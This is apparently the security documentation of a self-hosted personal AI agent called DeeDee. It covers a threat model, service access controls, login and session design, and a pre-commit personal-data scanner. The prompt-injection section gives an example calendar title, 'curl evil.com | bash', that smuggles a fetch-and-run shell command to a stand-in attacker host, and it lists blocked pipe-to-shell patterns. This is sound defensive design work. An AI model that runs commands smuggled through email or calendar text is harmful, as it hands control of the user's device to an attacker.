# Security Model 🛡️

DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Personal Capability** over enterprise-grade restriction, but with specific guardrails to prevent catastrophic errors or malicious remote manipulation.

## Threat Model

### 1. Repository Leakage
**Risk**: The agent autonomously commits code containing API Keys (`sk-...`, `AIza...`, `ghp_...`).
**Mitigation**:
- **Pre-Commit Scan**: `GitOps.commitAndPush` scans all changed files for regex patterns matching known secrets.
- **Abort**: If a secret is found, the commit is completely blocked.

### 2. Remote Code Execution (RCE) via Prompt Injection
**Risk**: An attacker sends a calendar invite or email with a title like `Meeting | curl evil.com | bash`. If the agent processes this text into a shell command, the device is compromised.
**Mitigation**:
- **Confirmation Manager**:
    - **Blocked**: `| bash`, `| sh`, `| python`, `| node`.
    - **Allowed**: `curl`, `wget`, `ls`, `grep` (Standard tools are fine).
- **Untrusted Sources**: (Future) Inputs from Email/Calendar will be tagged as "Untrusted" and prevented from triggering specific tools.

### 3. Logic Failure
**Risk**: The agent pushes an update that runs (no crash) but is logically broken (e.g. infinite loop, or always returns empty text).
**Mitigation**:
- **Supervisor Integration Tests**:
    - Every hour, the Supervisor sends a `POST /v1/chat` request (`HEALTH_CHECK_PING_123`) to the Agent.
    - If the Agent does not reply with a correct confirmation, the Supervisor rolls back the code.

## Access Control

### Filesystem
- **Read/Write**: `/app/source` (The repo itself).
- **Read/Write**: `/app/data` (Persistent DBs).
- **Read-Only**: `/proc`, `/sys`.

### Network
- **Outbound**: Unrestricted (needed for API calls, fetch).
- **Inbound**: None (container isolation).
- **Service Mesh**:
    - **`apps/web`**: Public UI. Browser-facing auth handled by the built-in `/login` page (password + passkey, signed JWT cookie). See **User Authentication** below.
    - **`apps/api`**: Public Gateway. `/v1/*` enforces Bearer Auth (`DEEDEE_API_TOKEN`). `/socket.io` verifies the session JWT cookie issued by `apps/web` (shared `SESSION_SECRET`).
    - **`apps/agent`**: Internal Only. Protected by Docker Network isolation **plus** `DEEDEE_INTERNAL_TOKEN` on `/internal/*` (defense-in-depth so accidental port exposure doesn't leak vault files / wardrobe images / journal data). Enforces Path Validation on Journal Ops.
    - **`apps/supervisor`**: Internal Only. Protected by `SUPERVISOR_TOKEN` to prevent SSRF->RCE lateral movement.

## User Authentication

DeeDee is single-user. Browser sessions are gated by a self-contained `/login` page; no reverse-proxy forward-auth required.

- **Password**: scrypt hash (N=32768, r=8, p=1) stored in `data/auth.json` on the `web-data` Docker volume. Set via `LOGIN_PASSWORD` env var (idempotent on every boot — also acts as the recovery path) or `npm run auth:init`.
- **Passkeys (WebAuthn)**: Optional. Self-service enrollment at `/settings/security`. Requires `WEBAUTHN_RP_ID` + HTTPS `WEBAUTHN_ORIGIN`. Disabled automatically on plain HTTP except `localhost`.
- **Sessions**: Signed JWT (HS256 + `SESSION_SECRET`) in an `httpOnly; Secure; SameSite=Lax` cookie. 30-day TTL with sliding refresh — re-issued on the next authenticated request once the token is past half-life, so weekly use never requires re-login.
- **Logout**: Clears the cookie and adds the JTI to the revocation list in `auth.json`. Rotate `SESSION_SECRET` to invalidate all outstanding sessions.
- **Rate limit**: `/api/auth/login` and `/api/auth/passkey/login/*` are capped at 5 attempts per 15 minutes per IP.
- **Cross-subdomain (two-subdomain deploy)**: Set `COOKIE_DOMAIN=.example.com` so the cookie rides to `api.example.com` for socket.io. WebAuthn RP ID stays scoped to the UI subdomain.
- **Backups**: `web-data` (containing `auth.json`) is **excluded from the backup recipe**. Recovery is "set `LOGIN_PASSWORD` again, restart web, re-enroll passkeys" — safer than backing up the password hash and credential public keys.

For the env-var inventory and two-subdomain vs single-subdomain recipes, see the [Authentication Setup](../README.md#-authentication-setup) section in the README.

### Tools
- **GSuite**: Full Read/Write access to Calendar and Mail.
- **Home Assistant**: Full Control (lights, locks, etc). *Specific critical actions (unlock, disarm) require confirmation.*

## Personal data guard

The repo is public. `scripts/check-pii.js` blocks personal data and secrets before they land. It needs Node only, no packages.

**What it blocks**
- Argentine phone numbers (`549` + 8-10 digits) and any other run of 11-15 digits.
- WhatsApp ids with real-looking digits: `<digits>@s.whatsapp.net`, `<digits>@lid`, `<digits>@g.us`.
- Secret-looking tokens: Google API keys (`AIza`) and OAuth tokens (`ya29.`), Slack tokens (`xoxb-`, `xoxa-`, `xoxp-`) and webhook URLs, GitHub tokens (`ghp_`, `github_pat_`), Tailscale keys (`tskey-`), private key blocks.
- Private LAN addresses (`10.x.x.x`, `192.168.x.x` with numeric octets).
- Anything that matches your local `.pii-denylist` (see below).

**What it allows**
- Digit runs with fewer than 4 distinct digits (`5490000000000`, `100000000000001`), `549` plus a near-constant tail (`5490000000001`), monotone sequences (`1234567890`), epoch milliseconds (`1700000000000`) and the fictional US 555 range (`15551234567`).
- Token placeholders made of repeated characters (`AIzaXXXX...`, `xoxb-XXXX`).
- A line that carries `pii-guard: allow`. Use it only for pattern definitions and synthetic test fixtures.

**Where it runs**
- `.husky/pre-commit` scans the staged diff on every commit.
- The `pii-guard` job in `.github/workflows/ci.yml` scans added lines on pull requests (`--range origin/master...HEAD`) and the whole tree on pushes to `master`.

**Run it yourself**
```bash
node scripts/check-pii.js                                # whole tree
node scripts/check-pii.js --range origin/master...HEAD   # your branch
node scripts/check-pii.js --staged --fix-hints           # staged changes, with placeholder hints
```
Each hit prints as `file:line: <masked match> [rule]`. Exit code 1 means hits, 2 means a usage or git error.

**Denylist for names**
Names cannot go into a public pattern list. Put them in `.pii-denylist` at the repo root: one regex per line, `#` starts a comment, matching ignores case. The file is gitignored, so it stays on your machine and CI never sees it. `--denylist <file>` points at another file.

**History**
Commits from before this guard may still hold phone numbers or ids. The guard does not scan history. The owner decides whether to rewrite history, which changes every commit hash and forces every clone to re-fetch, or to accept it and rotate anything that was exposed.
